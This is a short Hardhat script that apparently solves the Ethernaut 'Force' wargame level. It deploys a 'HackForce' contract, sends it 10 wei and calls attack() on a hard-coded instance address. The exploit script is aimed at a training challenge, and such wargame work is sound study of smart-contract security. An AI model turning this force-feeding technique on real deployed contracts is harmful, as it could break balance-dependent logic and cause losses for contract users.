import { ethers } from "hardhat";

const InstanceAddress = "0xc6f1E53B3228F4Dea91CAb1Cd8371f4344c8E692";

async function main() {
  const HackForce = await ethers.getContractFactory("HackForce");
  const hack = await HackForce.deploy();
  const account = (await ethers.getSigners())[0];
  await hack.deployed();
  let tx = await account.sendTransaction({
    to: hack.address,
    value: 10,
  });
  await tx.wait();
  tx = await hack.attack(InstanceAddress);
  await tx.wait();
  console.log("successfully hacked");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
